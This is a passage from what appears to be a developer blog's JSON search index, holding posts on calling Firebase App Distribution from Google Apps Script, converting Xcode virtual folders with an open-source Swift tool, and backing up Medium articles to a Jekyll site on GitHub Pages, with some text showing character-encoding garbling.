these wonderful possibilities will never happen. It‚Äôs by continuously persisting in writing that I gradually improved my skills, enriched my content, and increased the chances of helping others.During that period, I caught the wave of the times as apps and software engineering flourished. I continuously learned, developed new features, and transformed my experiences into articles to share. At the same time, fresh talents kept joining the development team, so each post always gained new followers.In recent years, with the industry cooling down, the impact of AI on digital content creation, and changes in Medium‚Äôs SEO policies, the growth of new followers has clearly slowed. I have adopted a more relaxed attitude toward reaching the ‚Äú1K goal,‚Äù but I still maintain the original spirit of sharing, continuing to document and help friends facing similar issues.Additionally, I have started sharing some daily life, travel journals, unboxing posts, and personal interests related to automation (RPA).1K is just a milestone. I look forward to your continued support in the future.Whether or not I continue writing about iOS development, I will keep sharing the problems I encounter and the lessons I learn.Sincerely thank you all for your support and companionship over the past 7 years!Harry,2025/04/02.EnglishAfter seven years on Medium, publishing 112 articles, about 130,000 words, and spending over 800 hours, I finally reached my long-awaited milestone of 1,000 followers on April 2, 2025.It‚Äôs been quite a journey. Back in 2018, when I switched my focus from web development to app development, everything felt new and exciting. With an insatiable curiosity, I constantly searched for resources, learned by doing, and eventually completed and published my first app.As someone entirely self-taught, I gained a tremendous amount from online articles shared by many experienced developers. This inspired me to start writing myself, motivated by the concept of ‚Äúlearning by teaching,‚Äù hoping to create a positive cycle of knowledge sharing.Initially, I was caught up in doubts about sharing ‚Äî always concerned whether my content was thorough enough, whether I‚Äôd be criticized, or even worse, whether it provided no real value to readers.Eventually, I shifted my mindset. Writing is like planting a seed ‚Äî someday, a developer facing a similar problem might find help or inspiration through my posts. Even if my articles weren‚Äôt immediately noticed, if I never started writing, those opportunities would never arise. Through continuous writing and persistence, I gradually improved my skills, enriched my content, and increased its potential to help others.Fortunately, I rode the wave of rapid growth in apps and software engineering. Day after day, I learned, built new features, and shared my experiences through writing. There was also a steady influx of new developers entering the field, and each article brought new followers.In recent years, growth has notably slowed, impacted by industry cooling, AI-driven changes to digital content creation, and shifts in Medium‚Äôs SEO policies. Gradually, I adopted a more relaxed approach towards reaching the 1,000-follower mark. Yet, I never lost the initial passion for sharing and continued documenting my experiences to help those encountering similar issues. Additionally, I started sharing daily life stories, travel experiences, product reviews, and content about my personal interest in automation (RPA).Reaching 1,000 followers is just a milestone, and I look forward to your continued support in the future. Regardless of whether I continue writing about iOS development, I‚Äôll keep sharing the problems I encounter and the knowledge I gain.I sincerely thank everyone for your support and companionship over these past seven years!Harry,2025/04/02.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Google Apps ScriptÔΩúFast Integration with Google APIs Using Firebase App Distribution API", "url": "/posts/zrealm-robotic-process-automation/google-apps-script-fast-integration-with-google-apis-using-firebase-app-distribution-api-71400d408dc8/", "categories": "ZRealm Robotic Process Automation", "tags": "english, ai-translation, ios-app-development, firebase-app-distribution, google-apps-script, google-api, google-cloud-platform", "date": "2025-03-20 22:12:48 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Quick Integration Method for Google Apps Script x Google APIsUsing Google Apps...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Quick Integration Method for Google Apps Script x Google APIsUsing Google Apps Script with Firebase App Distribution API as an exampleBackgroundPreviously, I wrote several articles about using Google Apps Script. Among them, ‚ÄúUsing Google Apps Script to Automate Daily Data Report RPA‚Äù and ‚ÄúSimple 3 Steps ‚Äî Build a Free GA4 Auto Data Notification Bot‚Äù introduced how to connect Google Analytics with Google Sheets, Web App, Slack, Telegram using Google Apps Script to quickly build a visual data platform and notification service. Additionally, last month‚Äôs article ‚ÄúUsing Google Apps Script Web App Form to Connect Github Action CI/CD Workflow‚Äù directly used Google Apps Script Web App to connect with the Github API as a CI/CD GUI form service. In all these cases, whether using built-in Google Apps Script services or directly connecting to external services (Slack, Github‚Ä¶), there was no need to connect to Google APIs. This time, when optimizing the CI/CD GUI form, I want to display the Firebase Distribution download link directly on the Web App after packaging the internal test version. This can only be achieved by integrating with Google APIs.Google Apps Script x Firebase App Distribution API v1As shown in the above image, unlike the built-in ‚ÄúAnalyticsData‚Äù service for connecting with Google Analytics, Firebase App Distribution does not offer a built-in integration service, so an advanced method is required for integration. Originally thought I had to generate and exchange the Access Token using a Service Account myself (a bit complicated, you can refer to my previous Review Bot open-source project), but actually, it‚Äôs not that complicated.Google Apps Script x Google APIs Advanced Service IntegrationIntegration SettingsRefer to the official documentation for details. We need to follow these steps for advanced setup: You must enable Advanced Services in your script project. You must ensure that the API for the corresponding advanced service is enabled in the Cloud Platform (GCP) project used by the script. If your script project uses the default GCP project created on or after April 8, 2019, the API will be automatically enabled once you enable advanced services and save the script project. If you have not yet agreed, the system may also prompt you to accept the Google Cloud and Google API terms of service. If your script project uses a standard GCP project or an older default GCP project, you must manually enable the corresponding API for advanced services in the GCP project. You need edit permissions for the GCP project to make this change. 1. Project Setup ‚Äî Configure the associated Google Cloud Platform (GCP) projectGoogle Apps Script x Google APIs advanced integration requires you to create a GCP project and link it to Google Apps Script. The usage permissions for Google APIs are based on the GCP settings.Therefore, you need to create a GCP project (a Firebase GCP project is also acceptable), note the ‚ÄúProject Number‚Äù on the information homepage, and ensure that this GCP project has the Google APIs you want to use enabled, and that the currently logged-in account or the account you want to use has the necessary permissions for the GCP project and Google APIs. This article uses the Firebase App Distribution API as an example.Enter the Project Number into the Google Cloud Platform project number field under the Google Apps Script project settings. If the current logged-in account has permission for that GCP project, it will automatically bind and set successfully.2. Project Setup ‚Äî Enable Display of ‚Äúappsscript.json‚Äù Manifest File in the EditorAfter enabling, return to the editor, and the file list will show the appsscript.json configuration file:Make sure the oauthScopes include the following two descriptions: \"oauthScopes\": [ \"https://www.googleapis.com/auth/script.external_request\", \"https://www.googleapis.com/auth/cloud-platform\" ]If not, please manually paste and save.3. Writing Integration CodeAfter setting up the GCP project, we can start writing the integration code by directly referring to the official documentation of the Google APIs we want to connect to, such as Firebase App Distribution API v1:const project = \"projects/[Firebase Project ID]/apps/[Firebase APP ID]\"; // Please replace with your Project ID &amp; App IDfunction debug() { const releases = firebaseDistribution(\"\"); releases.forEach(function(release) { // Release Object: https://firebase.google.com/docs/reference/app-distribution/rest/v1/projects.apps.releases?hl=zh-tw#Release Logger.log(`${release.name} Download URL: ${release.testingUri}`); });}function firebaseDistribution(releaseNote) { const url = \"https://firebaseappdistribution.googleapis.com/v1/\"+project+\"/releases?filter=releaseNotes.text%3D*\"+releaseNote+\"*\"; // Filter: https://firebase.google.com/docs/reference/app-distribution/rest/v1/projects.apps.releases/list?hl=zh-tw const headers = { \"Content-Type\": \"application/json; charset=UTF-8\", \"Authorization\": \"Bearer \" + ScriptApp.getOAuthToken(), // Use the current account to get the token directly }; const options = { \"method\": \"get\", \"headers\": headers }; const data = UrlFetchApp.fetch(url, options); const result = JSON.parse(data.getContentText()).releases; if (result == undefined) { return []; } return result;}[Firebase Project ID] and [Firebase APP ID] can be found in the Firebase project settings:After pasting the code, the first execution requires permission authorization. Click ‚ÄúReview Permissions‚Äù Select the account to execute, usually the current Google Apps Script account Select ‚ÄúAdvanced‚Äù to expand -&gt; Click ‚ÄúGo to XXX‚ÄùThis is an app we created for our own use, so it does not require Google verification. Click ‚ÄúAllow‚Äù The above screen may not appear and can be ignored if absent.Allow then click ‚ÄúDebug‚Äù or ‚ÄúRun‚Äù later to execute the program:If an error occurs:Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 403. Truncated server response: { \"error\": { \"code\": 403, \"message\": \"Request had insufficient authentication scopes.\", \"status\": \"PERMISSION_DENIED\", \"details\":... (use muteHttpExceptions option to examine full response)...orException: Specified permissions are not sufficient to call UrlFetchApp.fetch. Required permissions: https://www.googleapis.com/auth/script.external_requestPlease ensure that the oauthScopes in appsscript.json includes the following two descriptions (refer to step 2):\"oauthScopes\": [ \"https://www.googleapis.com/auth/script.external_request\", \"https://www.googleapis.com/auth/cloud-platform\" ]If an error occurs:Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 401. Truncated server response: { \"error\": { \"code\": 401, \"message\": \"Request had invalid authentication credentials. Expected OAuth 2 access token, login cookie or othe... (use muteHttpExceptions option to examine full response)Represents a GCP project that has not been bound yet (refer to Step 1), or the GCP project has not enabled the desired Google APIs, or the current account lacks permission to use the GCP/Google APIs or the Firebase App. Please check the settings.If an error occurs:Exception: Request failed for https://firebaseappdistribution.googleapis.com returned code 404. Truncated server response:orException: Request failed for https://firebaseappdistribution.googleapis.com returned code 400. Truncated server response: { \"error\": { \"code\": 400, \"message\": \"Request contains an invalid argument.\", \"status\": \"INVALID_ARGUMENT\" }}Please verify if the Google APIs request path is correct.Integration Successful üéâüéâüéâYou can see that in less than 10 lines of code, you can seamlessly connect to Google APIs, which is very convenient. For those interested, you can compare it with implementing it yourself, where the authentication token exchange steps for connecting to Google APIs are quite complicated.Next Steps:Combined with the previous article ‚ÄúUsing Google Apps Script Web App Form to Connect Github Action CI/CD Workflow‚Äù, this integrates the CI/CD tasks and displays the Firebase App Distribution download link on the Web App for colleagues to download directly.Demo Result Other Google APIs can also be connected in the same way.2025/07 Update:This feature has been integrated into the actual packaging tool. You can refer to the latest article case: ‚ÄúCI/CD Practical Guide (Part 4): Using Google Apps Script Web App to Connect GitHub Actions for Building a Free and Easy Packaging Tool Platform‚ÄùIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Xcode Virtual Directory Issues: Streamline Your Project Structure with Open Source Tools", "url": "/posts/zrealm-dev/xcode-virtual-directory-issues-streamline-your-project-structure-with-open-source-tools-fd719053b376/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, xcode, swift, tuist, xcodegen", "date": "2025-03-02 20:21:31 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Investigation of the Eternal XCode Virtual Directory Issue and My Open Source ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Investigation of the Eternal XCode Virtual Directory Issue and My Open Source Tool SolutionApple developer occupational hazard: Early use of virtual directories in Xcode caused messy directory structures and made integration with modern tools like XcodeGen and Tuist difficult.Photo by Saad SalimEnglish version of this post:Exploring the Long-Standing Issues of XCode Virtual Directories and My Open Source Tool SolutionBackgroundAs the team size and project grow, the XCode project file (.xcodeproj) increases in size. Depending on the project‚Äôs complexity, it can reach hundreds of thousands or even millions of lines. With multiple people working on different branches simultaneously, conflicts are inevitable; XcodeProj file conflicts are as hard to resolve as Storyboard/.xib conflicts. Since it is also a pure descriptor file, it‚Äôs easy to accidentally remove files others added or bring back references to files others deleted during conflict resolution.Another issue is that as modularization progresses, the process of creating and managing modules in the XCode project file (.xcodeproj) is very unfriendly. Changes to modules can only be viewed through diffs in the XCode project file, which hinders the team‚Äôs move toward modularization. If it‚Äôs just to prevent conflicts, you can simply do File Sorting in pre-commit. There are many existing scripts on Github you can directly refer to for setup.XCFolder In short , developed a tool that converts XCode‚Äôs early virtual directories into physical directories based on the directory structure in XCode. Scroll down to continue reading the story‚Ä¶Modernizing Xcode Project File ManagementJust like we discourage using Storyboard or .xib in team development, we need a well-maintained, iterative, and code-reviewable interface to manage the ‚ÄúXCode project files.‚Äù Currently, there are two popular free tools available on the market: XCodeGen: A classic tool that uses YAML to define Xcode project content and then converts it into an Xcode project file (.xcodeproj).It directly uses YAML to define the structure, making it easier to learn and use. However, it has weaker support for modularization, dependency management, and dynamic YAML configuration. Tuist: A newer tool released in recent years that uses Swift DSL to define Xcode project content, then converts it into an Xcode project file (.xcodeproj).It is more stable and flexible, with built-in modularization and dependency management features, but has a higher learning curve and adoption barrier. No matter which one, our core workflow will become: Create XCode Project Configuration File (XCodeGen project.yaml or Tuist Project.swift) Adding XCodeGen or Tuist to Developer and CI/CD Server Environments Generate .xcodeproj XCode Project Files Using XCodeGen or Tuist via Configuration Files Add /*.xcodeproj directory files to .gitignore Adjust the developer workflow: when switching branches, run XCodeGen or Tuist to generate the .xcodeproj Xcode project file through configuration files. Adjust the CI/CD process to run XCodeGen or Tuist to generate the .xcodeproj Xcode project file through configuration files. Completed .xcodeproj XCode project files are generated by XCodeGen or Tuist based on YAML or Swift DSL configuration files. The same configuration file and tool version will produce the same result; therefore, we don‚Äôt need to commit .xcodeproj files to Git. This ensures no future .xcodeproj file conflicts. Changes in project structure or module additions are made by updating the configuration files. Since these are written in YAML or Swift, we can easily iterate and perform code reviews.Tuist Swift Example: Project.swiftimport ProjectDescriptionlet project = Project( name: \"MyApp\", targets: [ Target( name: \"MyApp\", platform: .iOS, product: .app, bundleId: \"com.example.myapp\", deploymentTarget: .iOS(targetVersion: \"15.0\", devices: [.iphone, .ipad]), infoPlist: .default, sources: [\"Sources/**\"], resources: [\"Resources/**\"], dependencies: [] ), Target( name: \"MyAppTests\", platform: .iOS, product: .unitTests, bundleId: \"com.example.myapp.tests\", deploymentTarget: .iOS(targetVersion: \"15.0\", devices: [.iphone, .ipad]), infoPlist: .default, sources: [\"Tests/**\"], dependencies: [.target(name: \"MyApp\")] ) ])XCodeGen YAML Example: project.yamlname: MyAppoptions: bundleIdPrefix: com.example deploymentTarget: iOS: '15.0'targets: MyApp: type: application platform: iOS sources: [Sources] resources: [Resources] info: path: Info.plist properties: UILaunchScreen: {} dependencies: - framework: Vendor/SomeFramework.framework - sdk: UIKit.framework - package: Alamofire MyAppTests: type: bundle.unit-test platform: iOS sources: [Tests] dependencies: - target: MyAppFile Directory StructureXCodeGen or Tuist generates the XCode project file (.xcodeproj) directory structure based on the actual file directories and locations. The actual directory is the XCode project file directory.Therefore, the actual directory location of the file is very important, as we will directly use it as the XCode project file directory.In modern XCode / XCode projects, it is quite common for these two directories to be located at the same level, but this topic is what this article aims to explore.Early Xcode Used Virtual DirectoriesIn early versions of XCode, right-clicking the file directory and selecting ‚ÄúNew Group‚Äù did not create a physical folder. Files were placed in the project‚Äôs root directory and referenced in the .xcodeproj XCode project file, so the folder existed only within the XCode project file and not physically.As time has passed, Apple has gradually phased out this odd design in XCode. Later versions of XCode introduced ‚ÄúNew Group with Folder‚Äù by default, and to avoid creating a physical folder, you had to select ‚ÄúNew Group without Folder.‚Äù Now (XCode 16), there is only ‚ÄúNew Group,‚Äù which automatically generates the XCode project file directory based on the physical folder structure.Problems with Virtual Directories Cannot use XCodeGen or Tuist because both require a physical directory location to generate the XCode project file (.xcodeproj). Code Review Difficulty: The directory structure is not visible on the Git Web GUI; all files appear in a flat list. DevOps, Difficulty Integrating Third-Party Tools: For example, Sentry and GitHub can assign alerts or Auto-Assigner based on directories, but settings cannot be configured if there are only files without directories. The project directory structure is extremely complex, with many files flattened in the root directory. For an old project that didn‚Äôt handle the virtual directory issue early, there are over 3,000 virtual directory files. Manually matching and moving them would be so exhausting you‚Äôd probably quit to sell rice cakes. This can truly be called ‚ÄúApple Developer Occupational Hazard üòî.‚ÄùConvert Xcode Project Virtual Folder to Physical FolderFor all these reasons, we urgently need to convert the virtual directories in the XCode project into physical directories; otherwise, future project modernization and more efficient development processes cannot proceed.‚ùå Xcode 16 ‚ÄúConvert to folder‚Äù OptionXCode 16Last year, when XCode 16 was released, I noticed this new menu option. My original expectation was that it could automatically convert virtual directory files into physical directories.But in reality, it requires you to first create the folder structure and place the files in the correct physical locations. After clicking ‚ÄúConvert to folder,‚Äù it will change to the new XCode project directory setting called PBXFileSystemSynchronizedRootGroup. To be honest, this has no effect on the conversion itself; it is more about upgrading to the new directory setting after the conversion.The table of contents is not created, and the files are not properly placed. Clicking ‚ÄúConvert to folder‚Äù will cause the following error:Missing Associated FolderEach group must have an associated folder. The following groups are not associated with a folder:‚Ä¢ xxxxUse the file inspector to associate a folder with each group, or delete the groups after moving their content to another group.ü´• Open Source Projects venmo / synxAfter searching on Github for a long time, I only found this open-source tool written in Ruby for virtual to physical directory conversion. It works in practice, but since it hasn‚Äôt been updated for about 10 years, many files still require manual matching and moving. It can‚Äôt fully convert, so I gave up. However, I am still grateful for the inspiration from this open-source project, which made me consider developing my own conversion tool.‚úÖ My open-source projects ZhgChgLi / XCFolderCommand Line Tools developed purely in Swift, based on XcodeProj, parse .xcodeproj Xcode project files, read all files to get their directories, convert virtual directories into physical ones by parsing the directories, move files to the correct locations, and finally adjust the .xcodeproj Xcode project directory settings to complete the conversion.Usagegit clone https://github.com/ZhgChgLi/XCFolder.gitcd ./XCFolderswift run XCFolder YOUR_XCODEPROJ_FILE.xcodeproj ./Configuration.yamlFor Example:swift run XCFolder ./TestProject/DCDeviceTest.xcodeproj ./Configuration.yamlCI/CD Mode ( Non Interactive Mode )Ôºöswift run XCFolder YOUR_XCODEPROJ_FILE.xcodeproj ./Configuration.yaml --is-non-interactive-modeConfiguration.yaml can be used to set the desired execution parameters:# Directories to ignore, will not be parsed or convertedignorePaths:- \"Pods\"- \"Frameworks\"- \"Products\"# File types to ignore, will not be converted or movedignoreFileTypes:- \"wrapper.framework\" # Frameworks- \"wrapper.pb-project\" # Xcode project files#- \"wrapper.application\" # Applications#- \"wrapper.cfbundle\" # Bundles#- \"wrapper.plug-in\" # Plug-ins#- \"wrapper.xpc-service\" # XPC services#- \"wrapper.xctest\" # XCTest bundles#- \"wrapper.app-extension\" # App extensions# Only create directories and move files, do not adjust .xcodeproj Xcode project directory settingsmoveFileOnly: false# Prefer using git mv command to move filesgitMove: true‚ö†Ô∏è Please Note Before Execution: Please ensure there are no uncommitted changes in Git to avoid the script accidentally corrupting your project directory.(The script will check this and throw an error ‚ùå Error: There are uncommitted changes in the repository if any uncommitted changes are found.) By default, prioritize using the git mv command to move files to ensure complete git file log records. If the move fails or the project is not a Git repository, then use FileSystem Move to move the files. Just wait for the execution to complete:‚ö†Ô∏è Please note after execution: Please check if there are any missing (in red) files in the project directory. If the number is small, you can fix them manually. If there are many, please verify whether the ignorePaths and ignoreFileTypes settings in Configuration.yaml are correct, or create an Issue to let me know. Check if related paths in Build Settings, e.g., LIBRARY_SEARCH_PATHS, need to be manually adjusted. Suggest trying Clean &amp; Build to see if it helps. If you don‚Äôt want to manage the current .xcodeproj XCode project file, you can directly start using XCodeGen or Tuist to regenerate the directory files. Modify Script:Simply click ./Package.swift to open the project and modify the script content.Other Development Notes Thanks to XcodeProj, we can easily access the contents of .xcodeproj Xcode project files using Swift objects. Also developed using the Clean Architecture framework. In PBXGroup settings, if there is no path but only a name, it is a virtual directory; otherwise, it is a physical directory. XCode 16‚Äôs new directory setting PBXFileSystemSynchronizedRootGroup only requires declaring the root directory, which will be automatically resolved from the physical directory. There is no need to declare each directory and file inside the .xcodeproj Xcode project file. Using SPM (Package.swift) to develop Command Line Tools is really convenient! If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Automate Medium Article BackupÔΩúMirror to GitHub Pages with Jekyll Seamlessly", "url": "/posts/zrealm-dev/automate-medium-article-backup-mirror-to-github-pages-with-jekyll-seamlessly-5bb7d3a4954f/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, medium, jekyll, automation, ios-app-development, github-pages", "date": "2025-01-18 23:12:33 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Automating Backup of Medium Articles to Github Pages (Jekyll)Personal Medium A...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Automating Backup of Medium Articles to Github Pages (Jekyll)Personal Medium Article Backup Mirror Site Setup, Maintenance, Upgrading, and Customization RecordsPrefaceRunning Medium for six years now, the total number of articles surpassed 100 last year. As time goes by and the number of articles grows, I worry that Medium might suddenly shut down or my account may have issues, causing all my work to be lost. Some articles are less valuable, which is fine, but many record technical frameworks and problem-solving approaches at the time. I often revisit my previous articles to review knowledge. In recent years, I also started documenting travel stories abroad, which are memories and perform well in traffic. Losing these contents would mean they can never be rewritten.Develop Your Own Backup ToolI usually write articles directly on the Medium platform without my own backup. Therefore, during the 2022 Lunar New Year, I spent time developing a tool to download Medium articles and convert them into Markdown files (including article images, embedded code blocks, and other content) ‚Äî ZMediumToMarkdown ÔºöExtend the use of this tool by deploying the downloaded Markdown as a static backup mirror website on Github Pages using Jekyll (Chirpy Theme) ‚Äî https://zhgchg.li/https://zhgchg.li/At that time, I integrated the entire setup into a Github Template Repo for friends with the same needs to quickly deploy and use ‚Äî ZMediumToJekyll. Since then (2022), I have not updated the version or settings of Jekyll (Chirpy Theme); ZMediumToMarkdown is still maintained, and any formatting parsing errors found are promptly fixed. It is currently stable.At that time, the Jekyll (Chirpy Theme) version used was v5.x, which had no major issues and included all necessary features (e.g., sticky posts, categories, tags, cover images, comments‚Ä¶). The only problem was frequent scrolling issues where the page would sometimes not scroll, but after a few swipes, it worked again. This was a flaw in the user experience. Attempts to upgrade to v6.x still had the issue, and reporting it to the developers received no response. Additionally, upgrading brought more conflicts with each version, so the idea of upgrading was eventually abandoned altogether.Recently, I decided to solve issues with Jekyll (Chirpy Theme), upgrade its version, and conveniently optimize the quick deployment tool ZMediumToJekyll.New! medium-to-jekyll-starter üéâüéâmedium-to-jekyll-starter.github.ioI integrated the latest version v7.x of Jekyll (Chirpy Theme) with my ZMediumToMarkdown Medium article download and conversion tool into a new ‚Äî medium-to-jekyll-starter.github.io Github Template Repo.You can directly use this template Repo to quickly set up your own Medium mirror content backup site. Set it up once for permanent, continuous automatic backups, deployed completely free on Github Pages. For a step-by-step setup guide, please refer to this article: https://zhgchg.li/posts/medium-to-jekyll/Resultshttps://zhgchg.li/ All the above articles are **automatically downloaded from my Medium, converted into Markdown format, and re-uploaded.** Attached is a sample conversion of a random article for comparison: Original content on Medium / Converted result on personal websiteAfter the upgrade, the scrolling freeze issue no longer occurs. This upgrade also added customized dynamic content (displaying Medium follower count).Some Technical NotesJekyll (Chirpy Theme) The deployment setup on Github Pages mainly refers directly to the official Start Repo: Last month, I also used this project‚Äôs method to create a new open-source project ‚Äî Linkyee, an open-source Link Tree personal link page.https://link.zhgchg.li/Jekyll Customization Method (1) ‚Äî Override HTMLJekyll is a powerful Ruby static site generator. Jekyll (Chirpy Theme) is just a theme based on Jekyll. Compared to other themes, the Chirpy Theme offers the best quality, user experience, and comprehensive features.Jekyll pages are inheritable. We can add files with the same page names as Jekyll in ./_layouts. When generating the site, the engine will use your custom page content to replace the original.For example, if I want to add a line of text at the end of each article page, I first copy the original article page file (post.html) and place it in the ./_layouts directory:Open post.html with an editor, add text or customization in the appropriate place, and redeploy the website to see the customized results.You can also create a ./_include directory to store some shared page content files:Then in post.html, we can directly use {% include buymeacoffee.html %} to include the HTML content of that file for reuse. The advantage of rewriting the HTML layout file is full customization, allowing complete freedom to adjust page content and layout as desired; the downside is that during upgrades, conflicts or unexpected issues may arise, requiring a review of the customized content.Jekyll Customization Method (2) ‚Äî PluginThe second method is to use the Hook method in Plugin to inject custom content during Jekyll‚Äôs static content generation phase.Built-in Hook Owners and EventsHook events are many. Here, I only include the ones I used: site:pre_render and post:pre_render.Adding a new method is also simple; just add a Ruby file in the ./_plugins directory.posts-lastmod-hook.rb is a plugin that originally existsI want a few ‚Äúpseudo‚Äù dynamic content features. The first is to display the Medium follower count under the profile and show the page‚Äôs last updated time at the bottom.Created a zhgchgli-customize.rb under ./_plugins:#!/usr/bin/env ruby#require 'net/http'require 'nokogiri'require 'uri'require 'date'def load_medium_followers(url, limit = 10) return 0 if limit.zero? uri = URI(url) response = Net::HTTP.get_response(uri) case response when Net::HTTPSuccess then document = Nokogiri::HTML(response.body) follower_count_element = document.at('span.pw-follower-count &gt; a') follower_count = follower_count_element&amp;.text&amp;.split(' ')&amp;.first return follower_count \\|\\| 0 when Net::HTTPRedirection then location = response['location'] return load_medium_followers(location, limit - 1) else return 0 endend$medium_url = \"https://medium.com/@zhgchgli\"# could also define in _config.yml and retrieve in Jekyll::Hooks.register :site, :pre_render do \\|site\\| site.config$medium_followers = load_medium_followers($medium_url)$medium_followers = 1000 if $medium_followers == 0$medium_followers = $medium_followers.to_s.reverse.scan(/\\d{1,3}/).join(',').reverseJekyll::Hooks.register :site, :pre_render do \\|site\\| tagline = site.config['tagline'] followMe = &lt;&lt;-HTML &lt;a href=\"#{$medium_url}\" target=\"_blank\" style=\"display: block;text-align: center;font-style: normal;/* text-decoration: underline; */font-size: 1.2em;color: var(--heading-color);\"&gt;#{$medium_followers}+ Followers on Medium&lt;/a&gt; HTML site.config['tagline'] = \"#{followMe}\"; site.config['tagline'] += tagline; meta_data = site.data.dig('locales', 'en', 'meta'); # only implementation in en, could implement to all langs. if meta_data gmt_plus_8 = Time.now.getlocal(\"+08:00\") formatted_time = gmt_plus_8.strftime(\"%Y-%m-%d %H:%M:%S\") site.data['locales']['en']['meta'] += \"&lt;br/&gt;Last updated: #{formatted_time} +08:00\" endend The principle is to register a Hook before the website renders, adding HTML that displays the Medium follower count to the tagline section under the profile introduction in the config. The Medium follower count will be fetched to get the latest number each time it runs. The logic for the last updated time at the page bottom is similar: just add the last updated time string to locales-&gt;en-&gt;meta when generating the website. Supplement: Before generating the Hook article, you can get the Markdown; after generating the Hook article, you can get the generated HTML. After saving, you can first test the result locally with bundle exec jekyll s:Open 127.0.0.1:4000 in a browser to see the result.Finally, add a scheduled action on the Github Pages Repo to automatically regenerate the website, and it‚Äôs done:In the Jekyll (Chirpy Theme) repo project, find the Actions and locate pages-deploy.yml. Add the following under on:: schedule: - cron: \"10 1 * * *\" # Automatically runs once daily at 01:10 UTC, https://crontab.guru The advantage of plugins is that they enable dynamic content (scheduled content updates) without affecting the website structure or causing conflicts during upgrades; the downside is that the content and display positions that can be adjusted are limited.Jekyll (Chirpy Theme) Deployment Issues on Github Pages After v7.xBesides the website structure changes, the deployment script in v.7.x has also changed; the original deploy.sh script was removed, and the deployment now uses GitHub Actions steps directly:# build:# ... - name: Upload site artifact uses: actions/upload-pages-artifact@v3 with: path: \"_site${{ steps.pages.outputs.base_path }}\" deploy: environment: name: github-pages url: ${{ steps.deployment.outputs.page_url }} runs-on: ubuntu-latest needs: build steps: - name: Deploy to GitHub Pages id: deployment uses: actions/deploy-pages@v4But I encountered problems during the deployment process:Uploaded artifact size of 1737778940 bytes exceeds the allowed size of 1 GB Because my website content is too large, the Upload Artifact failed; however, the previous deployment script worked, so I had to revert to the original deploy.sh plus comment out this section above.Test Site Steps Fail During Github Pages DeploymentJekyll (Chirpy Theme) deployment includes a step to test the site by checking if the webpage content is correct, such as verifying links and ensuring no missing HTML tags.# build:# ... - name: Test site run: \\| bundle exec htmlproofer _site \\ --disable-external \\ --no-enforce-https \\ --ignore-empty-alt \\ --ignore-urls \"/^http:\\/\\/127.0.0.1/,/^http:\\/\\/0.0.0.0/,/^http:\\/\\/localhost/\"I added --no-enforce-https and --ignore-empty-alt to skip checks for https and HTML tags without alt attributes. Ignoring these two allows the check to pass (since I can‚Äôt change the content for now).The official documentation for the htmlproofer CLI commands does not mention this. After searching for a long time, I finally found the rules in a comment on an issue:https://github.com/gjtorikian/html-proofer/issues/727#issuecomment-1334430268Other Article Supplements Github Pages Custom Domain Tutorial Linkyee ‚Äî Quickly and freely create a personal LinkTree-like link page using GitHub Pages If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "[English] Medium to Jekyll Installation and Configuration Guide", "url": "/posts/tools/english-medium-to-jekyll-installation-and-configuration-guide-medium-to-jekyll/", "categories": "tools", "tags": "medium, github, jekyll, ruby, english", "date": "2025-01-17 08:00:00 +0800", "snippet": " 